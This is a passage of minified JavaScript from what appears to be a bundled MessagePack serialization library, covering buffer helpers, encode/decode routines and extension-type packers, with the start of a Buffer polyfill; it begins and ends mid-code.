ArrayBuffer,p=e.isArray=t("isarray");e.isArrayBuffer=l?f:s;var d=e.isBuffer=h?Buffer.isBuffer:s,y=e.isView=l?ArrayBuffer.isView||c("ArrayBuffer","buffer"):s;e.alloc=i,e.concat=o,e.from=n;var v=e.Array=t("./bufferish-array"),g=e.Buffer=t("./bufferish-buffer"),b=e.Uint8Array=t("./bufferish-uint8array"),w=e.prototype=t("./bufferish-proto"),E=c("ArrayBuffer")},{"./buffer-global":2,"./bufferish-array":4,"./bufferish-buffer":5,"./bufferish-proto":6,"./bufferish-uint8array":7,isarray:34}],9:[function(t,r,e){function n(t){return this instanceof n?(this.options=t,void this.init()):new n(t)}function i(t){for(var r in t)n.prototype[r]=o(n.prototype[r],t[r])}function o(t,r){function e(){return t.apply(this,arguments),r.apply(this,arguments)}return t&&r?e:t||r}function f(t){function r(t,r){return r(t)}return t=t.slice(),function(e){return t.reduce(r,e)}}function u(t){return s(t)?f(t):t}function a(t){return new n(t)}var s=t("isarray");e.createCodec=a,e.install=i,e.filter=u;var c=t("./bufferish");n.prototype.init=function(){var t=this.options;return t&&t.uint8array&&(this.bufferish=c.Uint8Array),this},e.preset=a({preset:!0})},{"./bufferish":8,isarray:34}],10:[function(t,r,e){t("./read-core"),t("./write-core"),e.codec={preset:t("./codec-base").preset}},{"./codec-base":9,"./read-core":22,"./write-core":25}],11:[function(t,r,e){function n(t){if(!(this instanceof n))return new n(t);if(t&&(this.options=t,t.codec)){var r=this.codec=t.codec;r.bufferish&&(this.bufferish=r.bufferish)}}e.DecodeBuffer=n;var i=t("./read-core").preset,o=t("./flex-buffer").FlexDecoder;o.mixin(n.prototype),n.prototype.codec=i,n.prototype.fetch=function(){return this.codec.decode(this)}},{"./flex-buffer":21,"./read-core":22}],12:[function(t,r,e){function n(t,r){var e=new i(r);return e.write(t),e.read()}e.decode=n;var i=t("./decode-buffer").DecodeBuffer},{"./decode-buffer":11}],13:[function(t,r,e){function n(t){return this instanceof n?void o.call(this,t):new n(t)}e.Decoder=n;var i=t("event-lite"),o=t("./decode-buffer").DecodeBuffer;n.prototype=new o,i.mixin(n.prototype),n.prototype.decode=function(t){arguments.length&&this.write(t),this.flush()},n.prototype.push=function(t){this.emit("data",t)},n.prototype.end=function(t){this.decode(t),this.emit("end")}},{"./decode-buffer":11,"event-lite":31}],14:[function(t,r,e){function n(t){if(!(this instanceof n))return new n(t);if(t&&(this.options=t,t.codec)){var r=this.codec=t.codec;r.bufferish&&(this.bufferish=r.bufferish)}}e.EncodeBuffer=n;var i=t("./write-core").preset,o=t("./flex-buffer").FlexEncoder;o.mixin(n.prototype),n.prototype.codec=i,n.prototype.write=function(t){this.codec.encode(this,t)}},{"./flex-buffer":21,"./write-core":25}],15:[function(t,r,e){function n(t,r){var e=new i(r);return e.write(t),e.read()}e.encode=n;var i=t("./encode-buffer").EncodeBuffer},{"./encode-buffer":14}],16:[function(t,r,e){function n(t){return this instanceof n?void o.call(this,t):new n(t)}e.Encoder=n;var i=t("event-lite"),o=t("./encode-buffer").EncodeBuffer;n.prototype=new o,i.mixin(n.prototype),n.prototype.encode=function(t){this.write(t),this.emit("data",this.read())},n.prototype.end=function(t){arguments.length&&this.encode(t),this.flush(),this.emit("end")}},{"./encode-buffer":14,"event-lite":31}],17:[function(t,r,e){function n(t,r){return this instanceof n?(this.buffer=i.from(t),void(this.type=r)):new n(t,r)}e.ExtBuffer=n;var i=t("./bufferish")},{"./bufferish":8}],18:[function(t,r,e){function n(t){t.addExtPacker(14,Error,[u,i]),t.addExtPacker(1,EvalError,[u,i]),t.addExtPacker(2,RangeError,[u,i]),t.addExtPacker(3,ReferenceError,[u,i]),t.addExtPacker(4,SyntaxError,[u,i]),t.addExtPacker(5,TypeError,[u,i]),t.addExtPacker(6,URIError,[u,i]),t.addExtPacker(10,RegExp,[f,i]),t.addExtPacker(11,Boolean,[o,i]),t.addExtPacker(12,String,[o,i]),t.addExtPacker(13,Date,[Number,i]),t.addExtPacker(15,Number,[o,i]),"undefined"!=typeof Uint8Array&&(t.addExtPacker(17,Int8Array,c),t.addExtPacker(18,Uint8Array,c),t.addExtPacker(19,Int16Array,c),t.addExtPacker(20,Uint16Array,c),t.addExtPacker(21,Int32Array,c),t.addExtPacker(22,Uint32Array,c),t.addExtPacker(23,Float32Array,c),"undefined"!=typeof Float64Array&&t.addExtPacker(24,Float64Array,c),"undefined"!=typeof Uint8ClampedArray&&t.addExtPacker(25,Uint8ClampedArray,c),t.addExtPacker(26,ArrayBuffer,c),t.addExtPacker(29,DataView,c)),s.hasBuffer&&t.addExtPacker(27,Buffer,s.from)}function i(r){return a||(a=t("./encode").encode),a(r)}function o(t){return t.valueOf()}function f(t){t=RegExp.prototype.toString.call(t).split("/"),t.shift();var r=[t.pop()];return r.unshift(t.join("/")),r}function u(t){var r={};for(var e in h)r[e]=t[e];return r}e.setExtPackers=n;var a,s=t("./bufferish"),Buffer=s.global,c=s.Uint8Array.from,h={name:1,message:1,stack:1,columnNumber:1,fileName:1,lineNumber:1}},{"./bufferish":8,"./encode":15}],19:[function(t,r,e){function n(t){t.addExtUnpacker(14,[i,f(Error)]),t.addExtUnpacker(1,[i,f(EvalError)]),t.addExtUnpacker(2,[i,f(RangeError)]),t.addExtUnpacker(3,[i,f(ReferenceError)]),t.addExtUnpacker(4,[i,f(SyntaxError)]),t.addExtUnpacker(5,[i,f(TypeError)]),t.addExtUnpacker(6,[i,f(URIError)]),t.addExtUnpacker(10,[i,o]),t.addExtUnpacker(11,[i,u(Boolean)]),t.addExtUnpacker(12,[i,u(String)]),t.addExtUnpacker(13,[i,u(Date)]),t.addExtUnpacker(15,[i,u(Number)]),"undefined"!=typeof Uint8Array&&(t.addExtUnpacker(17,u(Int8Array)),t.addExtUnpacker(18,u(Uint8Array)),t.addExtUnpacker(19,[a,u(Int16Array)]),t.addExtUnpacker(20,[a,u(Uint16Array)]),t.addExtUnpacker(21,[a,u(Int32Array)]),t.addExtUnpacker(22,[a,u(Uint32Array)]),t.addExtUnpacker(23,[a,u(Float32Array)]),"undefined"!=typeof Float64Array&&t.addExtUnpacker(24,[a,u(Float64Array)]),"undefined"!=typeof Uint8ClampedArray&&t.addExtUnpacker(25,u(Uint8ClampedArray)),t.addExtUnpacker(26,a),t.addExtUnpacker(29,[a,u(DataView)])),c.hasBuffer&&t.addExtUnpacker(27,u(Buffer))}function i(r){return s||(s=t("./decode").decode),s(r)}function o(t){return RegExp.apply(null,t)}function f(t){return function(r){var e=new t;for(var n in h)e[n]=r[n];return e}}function u(t){return function(r){return new t(r)}}function a(t){return new Uint8Array(t).buffer}e.setExtUnpackers=n;var s,c=t("./bufferish"),Buffer=c.global,h={name:1,message:1,stack:1,columnNumber:1,fileName:1,lineNumber:1}},{"./bufferish":8,"./decode":12}],20:[function(t,r,e){t("./read-core"),t("./write-core"),e.createCodec=t("./codec-base").createCodec},{"./codec-base":9,"./read-core":22,"./write-core":25}],21:[function(t,r,e){function n(){if(!(this instanceof n))return new n}function i(){if(!(this instanceof i))return new i}function o(){function t(t){var r=this.offset?p.prototype.slice.call(this.buffer,this.offset):this.buffer;this.buffer=r?t?this.bufferish.concat([r,t]):r:t,this.offset=0}function r(){for(;this.offset<this.buffer.length;){var t,r=this.offset;try{t=this.fetch()}catch(t){if(t&&t.message!=v)throw t;this.offset=r;break}this.push(t)}}function e(t){var r=this.offset,e=r+t;if(e>this.buffer.length)throw new Error(v);return this.offset=e,r}return{bufferish:p,write:t,fetch:a,flush:r,push:c,pull:h,read:s,reserve:e,offset:0}}function f(){function t(){var t=this.start;if(t<this.offset){var r=this.start=this.offset;return p.prototype.slice.call(this.buffer,t,r)}}function r(){for(;this.start<this.offset;){var t=this.fetch();t&&this.push(t)}}function e(){var t=this.buffers||(this.buffers=[]),r=t.length>1?this.bufferish.concat(t):t[0];return t.length=0,r}function n(t){var r=0|t;if(this.buffer){var e=this.buffer.length,n=0|this.offset,i=n+r;if(i<e)return this.offset=i,n;this.flush(),t=Math.max(t,Math.min(2*e,this.maxBufferSize))}return t=Math.max(t,this.minBufferSize),this.buffer=this.bufferish.alloc(t),this.start=0,this.offset=r,0}function i(t){var r=t.length;if(r>this.minBufferSize)this.flush(),this.push(t);else{var e=this.reserve(r);p.prototype.copy.call(t,this.buffer,e)}}return{bufferish:p,write:u,fetch:t,flush:r,push:c,pull:e,read:s,reserve:n,send:i,maxBufferSize:y,minBufferSize:d,offset:0,start:0}}function u(){throw new Error("method not implemented: write()")}function a(){throw new Error("method not implemented: fetch()")}function s(){var t=this.buffers&&this.buffers.length;return t?(this.flush(),this.pull()):this.fetch()}function c(t){var r=this.buffers||(this.buffers=[]);r.push(t)}function h(){var t=this.buffers||(this.buffers=[]);return t.shift()}function l(t){function r(r){for(var e in t)r[e]=t[e];return r}return r}e.FlexDecoder=n,e.FlexEncoder=i;var p=t("./bufferish"),d=2048,y=65536,v="BUFFER_SHORTAGE";n.mixin=l(o()),n.mixin(n.prototype),i.mixin=l(f()),i.mixin(i.prototype)},{"./bufferish":8}],22:[function(t,r,e){function n(t){function r(t){var r=s(t),n=e[r];if(!n)throw new Error("Invalid type: "+(r?"0x"+r.toString(16):r));return n(t)}var e=c.getReadToken(t);return r}function i(){var t=this.options;return this.decode=n(t),t&&t.preset&&a.setExtUnpackers(this),this}function o(t,r){var e=this.extUnpackers||(this.extUnpackers=[]);e[t]=h.filter(r)}function f(t){function r(r){return new u(r,t)}var e=this.extUnpackers||(this.extUnpackers=[]);return e[t]||r}var u=t("./ext-buffer").ExtBuffer,a=t("./ext-unpacker"),s=t("./read-format").readUint8,c=t("./read-token"),h=t("./codec-base");h.install({addExtUnpacker:o,getExtUnpacker:f,init:i}),e.preset=i.call(h.preset)},{"./codec-base":9,"./ext-buffer":17,"./ext-unpacker":19,"./read-format":23,"./read-token":24}],23:[function(t,r,e){function n(t){var r=k.hasArrayBuffer&&t&&t.binarraybuffer,e=t&&t.int64,n=T&&t&&t.usemap,B={map:n?o:i,array:f,str:u,bin:r?s:a,ext:c,uint8:h,uint16:p,uint32:y,uint64:g(8,e?E:b),int8:l,int16:d,int32:v,int64:g(8,e?A:w),float32:g(4,m),float64:g(8,x)};return B}function i(t,r){var e,n={},i=new Array(r),o=new Array(r),f=t.codec.decode;for(e=0;e<r;e++)i[e]=f(t),o[e]=f(t);for(e=0;e<r;e++)n[i[e]]=o[e];return n}function o(t,r){var e,n=new Map,i=new Array(r),o=new Array(r),f=t.codec.decode;for(e=0;e<r;e++)i[e]=f(t),o[e]=f(t);for(e=0;e<r;e++)n.set(i[e],o[e]);return n}function f(t,r){for(var e=new Array(r),n=t.codec.decode,i=0;i<r;i++)e[i]=n(t);return e}function u(t,r){var e=t.reserve(r),n=e+r;return _.toString.call(t.buffer,"utf-8",e,n)}function a(t,r){var e=t.reserve(r),n=e+r,i=_.slice.call(t.buffer,e,n);return k.from(i)}function s(t,r){var e=t.reserve(r),n=e+r,i=_.slice.call(t.buffer,e,n);return k.Uint8Array.from(i).buffer}function c(t,r){var e=t.reserve(r+1),n=t.buffer[e++],i=e+r,o=t.codec.getExtUnpacker(n);if(!o)throw new Error("Invalid ext type: "+(n?"0x"+n.toString(16):n));var f=_.slice.call(t.buffer,e,i);return o(f)}function h(t){var r=t.reserve(1);return t.buffer[r]}function l(t){var r=t.reserve(1),e=t.buffer[r];return 128&e?e-256:e}function p(t){var r=t.reserve(2),e=t.buffer;return e[r++]<<8|e[r]}function d(t){var r=t.reserve(2),e=t.buffer,n=e[r++]<<8|e[r];return 32768&n?n-65536:n}function y(t){var r=t.reserve(4),e=t.buffer;return 16777216*e[r++]+(e[r++]<<16)+(e[r++]<<8)+e[r]}function v(t){var r=t.reserve(4),e=t.buffer;return e[r++]<<24|e[r++]<<16|e[r++]<<8|e[r]}function g(t,r){return function(e){var n=e.reserve(t);return r.call(e.buffer,n,S)}}function b(t){return new P(this,t).toNumber()}function w(t){return new R(this,t).toNumber()}function E(t){return new P(this,t)}function A(t){return new R(this,t)}function m(t){return B.read(this,t,!1,23,4)}function x(t){return B.read(this,t,!1,52,8)}var B=t("ieee754"),U=t("int64-buffer"),P=U.Uint64BE,R=U.Int64BE;e.getReadFormat=n,e.readUint8=h;var k=t("./bufferish"),_=t("./bufferish-proto"),T="undefined"!=typeof Map,S=!0},{"./bufferish":8,"./bufferish-proto":6,ieee754:32,"int64-buffer":33}],24:[function(t,r,e){function n(t){var r=s.getReadFormat(t);return t&&t.useraw?o(r):i(r)}function i(t){var r,e=new Array(256);for(r=0;r<=127;r++)e[r]=f(r);for(r=128;r<=143;r++)e[r]=a(r-128,t.map);for(r=144;r<=159;r++)e[r]=a(r-144,t.array);for(r=160;r<=191;r++)e[r]=a(r-160,t.str);for(e[192]=f(null),e[193]=null,e[194]=f(!1),e[195]=f(!0),e[196]=u(t.uint8,t.bin),e[197]=u(t.uint16,t.bin),e[198]=u(t.uint32,t.bin),e[199]=u(t.uint8,t.ext),e[200]=u(t.uint16,t.ext),e[201]=u(t.uint32,t.ext),e[202]=t.float32,e[203]=t.float64,e[204]=t.uint8,e[205]=t.uint16,e[206]=t.uint32,e[207]=t.uint64,e[208]=t.int8,e[209]=t.int16,e[210]=t.int32,e[211]=t.int64,e[212]=a(1,t.ext),e[213]=a(2,t.ext),e[214]=a(4,t.ext),e[215]=a(8,t.ext),e[216]=a(16,t.ext),e[217]=u(t.uint8,t.str),e[218]=u(t.uint16,t.str),e[219]=u(t.uint32,t.str),e[220]=u(t.uint16,t.array),e[221]=u(t.uint32,t.array),e[222]=u(t.uint16,t.map),e[223]=u(t.uint32,t.map),r=224;r<=255;r++)e[r]=f(r-256);return e}function o(t){var r,e=i(t).slice();for(e[217]=e[196],e[218]=e[197],e[219]=e[198],r=160;r<=191;r++)e[r]=a(r-160,t.bin);return e}function f(t){return function(){return t}}function u(t,r){return function(e){var n=t(e);return r(e,n)}}function a(t,r){return function(e){return r(e,t)}}var s=t("./read-format");e.getReadToken=n},{"./read-format":23}],25:[function(t,r,e){function n(t){function r(t,r){var n=e[typeof r];if(!n)throw new Error('Unsupported type "'+typeof r+'": '+r);n(t,r)}var e=s.getWriteType(t);return r}function i(){var t=this.options;return this.encode=n(t),t&&t.preset&&a.setExtPackers(this),this}function o(t,r,e){function n(r){return e&&(r=e(r)),new u(r,t)}e=c.filter(e);var i=r.name;if(i&&"Object"!==i){var o=this.extPackers||(this.extPackers={});o[i]=n}else{var f=this.extEncoderList||(this.extEncoderList=[]);f.unshift([r,n])}}function f(t){var r=this.extPackers||(this.extPackers={}),e=t.constructor,n=e&&e.name&&r[e.name];if(n)return n;for(var i=this.extEncoderList||(this.extEncoderList=[]),o=i.length,f=0;f<o;f++){var u=i[f];if(e===u[0])return u[1]}}var u=t("./ext-buffer").ExtBuffer,a=t("./ext-packer"),s=t("./write-type"),c=t("./codec-base");c.install({addExtPacker:o,getExtPacker:f,init:i}),e.preset=i.call(c.preset)},{"./codec-base":9,"./ext-buffer":17,"./ext-packer":18,"./write-type":27}],26:[function(t,r,e){function n(t){return t&&t.uint8array?i():m||E.hasBuffer&&t&&t.safe?f():o()}function i(){var t=o();return t[202]=c(202,4,p),t[203]=c(203,8,d),t}function o(){var t=w.slice();return t[196]=u(196),t[197]=a(197),t[198]=s(198),t[199]=u(199),t[200]=a(200),t[201]=s(201),t[202]=c(202,4,x.writeFloatBE||p,!0),t[203]=c(203,8,x.writeDoubleBE||d,!0),t[204]=u(204),t[205]=a(205),t[206]=s(206),t[207]=c(207,8,h),t[208]=u(208),t[209]=a(209),t[210]=s(210),t[211]=c(211,8,l),t[217]=u(217),t[218]=a(218),t[219]=s(219),t[220]=a(220),t[221]=s(221),t[222]=a(222),t[223]=s(223),t}function f(){var t=w.slice();return t[196]=c(196,1,Buffer.prototype.writeUInt8),t[197]=c(197,2,Buffer.prototype.writeUInt16BE),t[198]=c(198,4,Buffer.prototype.writeUInt32BE),t[199]=c(199,1,Buffer.prototype.writeUInt8),t[200]=c(200,2,Buffer.prototype.writeUInt16BE),t[201]=c(201,4,Buffer.prototype.writeUInt32BE),t[202]=c(202,4,Buffer.prototype.writeFloatBE),t[203]=c(203,8,Buffer.prototype.writeDoubleBE),t[204]=c(204,1,Buffer.prototype.writeUInt8),t[205]=c(205,2,Buffer.prototype.writeUInt16BE),t[206]=c(206,4,Buffer.prototype.writeUInt32BE),t[207]=c(207,8,h),t[208]=c(208,1,Buffer.prototype.writeInt8),t[209]=c(209,2,Buffer.prototype.writeInt16BE),t[210]=c(210,4,Buffer.prototype.writeInt32BE),t[211]=c(211,8,l),t[217]=c(217,1,Buffer.prototype.writeUInt8),t[218]=c(218,2,Buffer.prototype.writeUInt16BE),t[219]=c(219,4,Buffer.prototype.writeUInt32BE),t[220]=c(220,2,Buffer.prototype.writeUInt16BE),t[221]=c(221,4,Buffer.prototype.writeUInt32BE),t[222]=c(222,2,Buffer.prototype.writeUInt16BE),t[223]=c(223,4,Buffer.prototype.writeUInt32BE),t}function u(t){return function(r,e){var n=r.reserve(2),i=r.buffer;i[n++]=t,i[n]=e}}function a(t){return function(r,e){var n=r.reserve(3),i=r.buffer;i[n++]=t,i[n++]=e>>>8,i[n]=e}}function s(t){return function(r,e){var n=r.reserve(5),i=r.buffer;i[n++]=t,i[n++]=e>>>24,i[n++]=e>>>16,i[n++]=e>>>8,i[n]=e}}function c(t,r,e,n){return function(i,o){var f=i.reserve(r+1);i.buffer[f++]=t,e.call(i.buffer,o,f,n)}}function h(t,r){new g(this,r,t)}function l(t,r){new b(this,r,t)}function p(t,r){y.write(this,t,r,!1,23,4)}function d(t,r){y.write(this,t,r,!1,52,8)}var y=t("ieee754"),v=t("int64-buffer"),g=v.Uint64BE,b=v.Int64BE,w=t("./write-uint8").uint8,E=t("./bufferish"),Buffer=E.global,A=E.hasBuffer&&"TYPED_ARRAY_SUPPORT"in Buffer,m=A&&!Buffer.TYPED_ARRAY_SUPPORT,x=E.hasBuffer&&Buffer.prototype||{};e.getWriteToken=n},{"./bufferish":8,"./write-uint8":28,ieee754:32,"int64-buffer":33}],27:[function(t,r,e){function n(t){function r(t,r){var e=r?195:194;_[e](t,r)}function e(t,r){var e,n=0|r;return r!==n?(e=203,void _[e](t,r)):(e=-32<=n&&n<=127?255&n:0<=n?n<=255?204:n<=65535?205:206:-128<=n?208:-32768<=n?209:210,void _[e](t,n))}function n(t,r){var e=207;_[e](t,r.toArray())}function o(t,r){var e=211;_[e](t,r.toArray())}function v(t){return t<32?1:t<=255?2:t<=65535?3:5}function g(t){return t<32?1:t<=65535?3:5}function b(t){function r(r,e){var n=e.length,i=5+3*n;r.offset=r.reserve(i);var o=r.buffer,f=t(n),u=r.offset+f;n=s.write.call(o,e,u);var a=t(n);if(f!==a){var c=u+a-f,h=u+n;s.copy.call(o,o,c,u,h)}var l=1===a?160+n:a<=3?215+a:219;_[l](r,n),r.offset+=n}return r}function w(t,r){if(null===r)return A(t,r);if(I(r))return Y(t,r);if(i(r))return m(t,r);if(f.isUint64BE(r))return n(t,r);if(u.isInt64BE(r))return o(t,r);var e=t.codec.getExtPacker(r);return e&&(r=e(r)),r instanceof l?U(t,r):void D(t,r)}function E(t,r){return I(r)?k(t,r):void w(t,r)}function A(t,r){var e=192;_[e](t,r)}function m(t,r){var e=r.length,n=e<16?144+e:e<=65535?220:221;_[n](t,e);for(var i=t.codec.encode,o=0;o<e;o++)i(t,r[o])}function x(t,r){var e=r.length,n=e<255?196:e<=65535?197:198;_[n](t,e),t.send(r)}function B(t,r){x(t,new Uint8Array(r))}function U(t,r){var e=r.buffer,n=e.length,i=y[n]||(n<255?199:n<=65535?200:201);_[i](t,n),h[r.type](t),t.send(e)}function P(t,r){var e=Object.keys(r),n=e.length,i=n<16?128+n:n<=65535?222:223;_[i](t,n);var o=t.codec.encode;e.forEach(function(e){o(t,e),o(t,r[e])})}function R(t,r){if(!(r instanceof Map))return P(t,r);var e=r.size,n=e<16?128+e:e<=65535?222:223;_[n](t,e);var i=t.codec.encode;r.forEach(function(r,e,n){i(t,e),i(t,r)})}function k(t,r){var e=r.length,n=e<32?160+e:e<=65535?218:219;_[n](t,e),t.send(r)}var _=c.getWriteToken(t),T=t&&t.useraw,S=p&&t&&t.binarraybuffer,I=S?a.isArrayBuffer:a.isBuffer,Y=S?B:x,C=d&&t&&t.usemap,D=C?R:P,O={boolean:r,function:A,number:e,object:T?E:w,string:b(T?g:v),symbol:A,undefined:A};return O}var i=t("isarray"),o=t("int64-buffer"),f=o.Uint64BE,u=o.Int64BE,a=t("./bufferish"),s=t("./bufferish-proto"),c=t("./write-token"),h=t("./write-uint8").uint8,l=t("./ext-buffer").ExtBuffer,p="undefined"!=typeof Uint8Array,d="undefined"!=typeof Map,y=[];y[1]=212,y[2]=213,y[4]=214,y[8]=215,y[16]=216,e.getWriteType=n},{"./bufferish":8,"./bufferish-proto":6,"./ext-buffer":17,"./write-token":26,"./write-uint8":28,"int64-buffer":33,isarray:34}],28:[function(t,r,e){function n(t){return function(r){var e=r.reserve(1);r.buffer[e]=t}}for(var i=e.uint8=new Array(256),o=0;o<=255;o++)i[o]=n(o)},{}],29:[function(t,r,e){(function(r){"use strict";function n(){try{var t=new Uint8Array(1);return t.__proto__={__proto__:Uint8Array.prototype,foo:function(){return 42}},42===t.foo()&&"function"==typeof t.subarray&&0===t.subarray(1,1).byteLength}catch(t){return!1}}function i(){return Buffer.TYPED_ARRAY_SUPPORT?2147483647:1073741823}function o(t,r){if(i()<r)throw new RangeError("Invalid typed array length");return Buffer.TYPED_ARRAY_SUPPORT?(t=new Uint8Array(r),t.__proto__=Buffer.prototype):(null===t&&(t=new Buffer(r)),t.length=r),t}function Buffer(t,r,e){if(!(Buffer.TYPED_ARRAY_SUPPORT||this instanceof Buffer))return new Buffer(t,r,e);if("number"==typeof t){if("string"==typeof r)throw new Error("If encoding is specified then the first argument must be a string");return s(this,t)}return f(this,t,r,e)}function f(t,r,e,n){if("number"==typeof r)throw new TypeError('"value" argument must not be a number');return"undefined"!=typeof ArrayBuffer&&r instanceof ArrayBuffer?l(t,r,e,n):"string"==typeof r?c(t,r,e):p(t,r)}function u(t){if("number"!=typeof t)throw new TypeError('"size" argument must be a number');if(t<0)throw new RangeError('"size" argument must not be negative')}function a(t,r,e,n){return u(r),r<=0?o(t,r):void 0!==e?"string"==typeof n?o(t,r).fill(e,n):o(t,r).fill(e):o(t,r)}function s(t,r){if(u(r),t=o(t,r<0?0:0|d(r)),!Buffer.TYPED_ARRAY_SUPPORT)for(var e=0;e<r;++e)t[e]=0;return t}function c(t,r,e){if("string"==typeof e&&""!==e||(e="utf8"),!Buffer.isEncoding(e))throw new TypeError('"encoding" must be a valid string encoding');var n=0|v(r,e);t=o(t,n);var i=t.write(r,e);return i!==n&&(t=t.slice(0,i)),t}function h(t,r){var e=r.length<0?0:0|d(r.length);t=o(t,e);for(var n=0;n<e;n+=1)t[n]=255&r[n];return t}function l(t,r,e,n){if(r.byteLength,e<0||r.byteLength<e)throw new RangeError("'offset' is out of bounds");if(r.byteLength<e+(n||0))throw new RangeError("'length' is out of bounds");return r=void 0===e&&void 0===n?new Uint8Array(r):void 0===n?new Uint8Array(r,e):new Uint8Array(r,e,n),Buffer.TYPED_ARRAY_SUPPORT?(t=r,t.__proto__=Buffer.prototype):t=h(t,r),t}function p(t,r){if(Buffer.isBuffer(r)){var e=0|d(r.length);return t=o(t,e),0===t.length?t:(r.copy(t,0,0,e),t)}if(r){if("undefined"!=typeof ArrayBuffer&&r.buffer instanceof ArrayBuffer||"length"in r)return"number"!=typeof r.length||H(r.length)?o(t,0):h(t,r);if("Buffer"===r.type&&Q(r.data))return h(t,r.data)}throw new TypeError("First argument must be a string, Buffer, ArrayBuffer, Array, or array-like object.")}function d(t){if(t>=i())throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+i().toString(16)+" bytes");return 0|t}function y(t){return+t!=t&&(t=0),Buffer.alloc(+t)}function v(t,r){if(Buffer.isBuffer(t))return t.length;if("undefined"!=typeof ArrayBuffer&&"function"==typeof ArrayBuffer.isView&&(ArrayBuffer.isView(t)||t instanceof ArrayBuffer))return t.byteLength;"string"!=typeof t&&(t=""+t);var e=t.length;if(0===e)return 0;for(var n=!1;;)switch(r){case"ascii":case"latin1":case"binary":return e;case"utf8":case"utf-8":case void 0:return q(t).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return 2*e;case"hex":return e>>>1;case"base64":return X(t).length;default:if(n)return q(t).length;r=(""+r).toLowerCase(),n=!0}}function g(t,r,e){var n=!1;if((void 0===r||r<0)&&(r=0),r>this.length)return"";if((void 0===e||e>this.length)&&(e=this.length),e<=0)return"";if(e>>>=0,r>>>=0,e<=r)return"";for(t||(t="utf8");;)switch(t){case"hex":return I(this,r,e);case"utf8":case"utf-8":return k(this,r,e);case"ascii":return T(this,r,e);case"latin1":case"binary":return S(this,r,e);case"base64":return R(this,r,e);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return Y(this,r,e);default:if(n)throw new TypeError("Unknown encoding: "+t);t=(t+"").toLowerCase(),n=!0}}function b(t,r,e){var n=t[r];t[r]=t[e],t[e]=n}function w(t,r,e,n,i){if(0===t.length)return-1;if("string"==typeof e?(n=e,e=0):e>2147483647?e=2147483647:e<-2147483648&&(e=-2147483648),e=+e,isNaN(e)&&(e=i?0:t.length-1),e<0&&(e=t.length+e),e>=t.length){if(i)return-1;e=t.length-1}else if(e<0){if(!i)return-1;e=0}if("string"==typeof r&&(r=Buffer.from(r,n)),Buffer.isBuffer(r))return 0===r.length?-1:E(t,r,e,n,i);if("number"==typeof r)return r=255&r,Buffer.TYPED_ARRAY_SUPPORT&&"function"==typeof Uint8Array.prototype.indexOf?i?Uint8Array.prototype.indexOf.call(t,r,e):Uint8Array.prototype.lastIndexOf.call(t,r,e):E(t,[r],e,n,i);throw new TypeError("val must be string, number or Buffer")}function E(t,r,e,n,i){function o(t,r){return 1===f?t[r]:t.readUInt16BE(r*f)}var f=1,u=t.length,a=r.length;if(void 0!==n&&(n=String(n).toLowerCase(),"ucs2"===n||"ucs-2"===n||"utf16le"===n||"utf-16le"===n)){if(t.length<2||r.length<2)return-1;f=2,u/=2,a/=2,e/=2}var s;if(i){var c=-1;for(s=e;s<u;s++)if(o(t,s)===o(r,c===-1?0:s-c)){if(c===-1&&(c=s),s-c+1===a)return c*f}else c!==-1&&(s-=s-c),c=-1}else for(e+a>u&&(e=u-a),s=e;s>=0;s--){for(var h=!0,l=0;l<a;l++)if(o(t,s+l)!==o(r,l)){h=!1;break}if(h)return s}return-1}function A(t,r,e,n){e=Number(e)||0;var i=t.length-e;n?(n=Number(n),n>i&&(n=i)):n=i;var o=r.length;if(o%2!==0)throw new TypeError("Invalid hex string");n>o/2&&(n=o/2);for(var f=0;f<n;++f){var u=parseInt(r.substr(2*f,2),16);if(isNaN(u))return f;t[e+f]=u}return f}function m(t,r,e,n){return G(q(r,t.length-e),t,e,n)}function x(t,r,e,n){return G(W(r),t,e,n)}function B(t,r,e,n){return x(t,r,e,n)}function U(t,r,e,n){return G(X(r),t,e,n)}function P(t,r,e,n){return G(J(r,t.length-e),t,e,n)}function R(t,r,e){return 0===r&&e===t.length?Z.fromByteArray(t):Z.fromByteArray(t.slice(r,e))}function k(t,r,e){e=Math.min(t.length,e);for(var n=[],i=r;i<e;){var o=t[i],f=null,u=o>239?4:o>223?3:o>191?2:1;if(i+u<=e){var a,s,c,h;switch(u){case 1:o<128&&(f=o);break;case 2:a=t[i+1],128===(192&a)&&(h=(31&o)<<6|63&a,h>127&&(f=h));break;case 3:a=t[i+1],s=t[i+2],128===(192&a)&&128===(192&s)&&(h=(15&o)<<12|(63&a)<<6|63&s,h>2047&&(h<55296||h>57343)&&(f=h));break;case 4:a=t[i+1],s=t[i+2],c=t[i+3],128===(192&a)&&128===(192&s)&&128===(192&c)&&(h=(15&o)<<18|(63&a)<<12|(63&s)<<6|63&c,h>65535&&h<1114112&&(f=h))}}null===f?(f=65533,u=1):f>65535&&(f-=65536,n.push(f>>>10&1023|55296),f=56320|1023&f),n.push(f),i+=u}return _(n)}function _(t){var r=t.length;if(r<=$)return String.fromCharCode.apply(String,t);for(var e="",n=0;n<r;)e+=String.fromCharCode.apply(String,t.slice(n,n+=$));return e}function T(t,r,e){var n="";e=Math.min(t.length,e);for(var i=r;i<e;++i)n+=String.fromCharCode(127&t[i]);return n}function S(t,r,e){var n="";e=Math.min(t.length,e);for(var i=r;i<e;++i)n+=String.fromCharCode(t[i]);return n}function I(t,r,e){var n=t.length;(!r||r<0)&&(r=0),(!e||e<0||e>n)&&(e=n);for(var i="",o=r;o<e;++o)i+=V(t[o]);return i}function Y(t,r,e){for(var n=t.slice(r,e),i="",o=0;o<n.length;o+=2)i+=String.fromCharCode(n[o]+256*n[o+1]);return i}function C(t,r,e){if(t%1!==0||t<0)throw new RangeError("offset is not uint");if(t+r>e)throw new RangeError("Trying to access beyond buffer length")}function D(t,r,e,n,i,o){if(!Buffer.isBuffer(t))throw new TypeError('"buffer" argument must be a Buffer instance');if(r>i||r<o)throw new RangeError('"value" argument is out of bounds');if(e+n>t.length)throw new RangeError("Index out of range")}function O(t,r,e,n){r<0&&(r=65535+r+1);for(var i=0,o=Math.min(t.length-e,2);i<o;++i)t[e+i]=(r&255<<8*(n?i:1-i))>>>8*(n?i:1-i)}function L(t,r,e,n){r<0&&(r=4294967295+r+1);for(var i=0,o=Math.min(t.length-e,4);i<o;++i)t[e+i]=r>>>8*(n?i:3-i)&255}function M(t,r,e,n,i,o){if(e+n>t.length)throw new RangeError("Index out of range");if(e<0)throw new RangeError("Index out of range")}function N(t,r,e,n,i){return 